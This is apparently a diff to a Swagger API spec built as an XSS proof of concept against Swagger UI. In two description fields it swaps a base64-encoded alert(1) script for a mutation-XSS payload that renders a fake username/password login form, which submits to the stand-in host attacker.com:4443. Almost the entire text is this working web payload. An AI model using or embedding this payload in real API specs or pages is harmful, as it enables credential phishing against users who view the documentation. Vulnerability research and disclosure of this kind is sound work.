@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Swagger UI XSS
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT3igJ11c2VybmFtZeKAnSBuYW1lPeKAnXVzZXJuYW1l4oCdPjwvYnI+UGFzc3dvcmQ6PGJyPgo8aW5wdXQgdHlwZT3igJ11c2VybmFtZeKAnSBuYW1lPeKAnXBhc3N3b3Jk4oCdPjwvYnI+PGJyPgo8aW5wdXQgdHlwZT3igJ1zdWJtaXTigJ0gdmFsdWU94oCdTG9naW7igJ0+PC9icj4='></object>"></form>
   version: production
 basePath: /XSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT3igJ11c2VybmFtZeKAnSBuYW1lPeKAnXVzZXJuYW1l4oCdPjwvYnI+UGFzc3dvcmQ6PGJyPgo8aW5wdXQgdHlwZT3igJ11c2VybmFtZeKAnSBuYW1lPeKAnXBhc3N3b3Jk4oCdPjwvYnI+PGJyPgo8aW5wdXQgdHlwZT3igJ1zdWJtaXTigJ0gdmFsdWU94oCdTG9naW7igJ0+PC9icj4='></object>"></form>
           format: int64
           in: path
           name: id
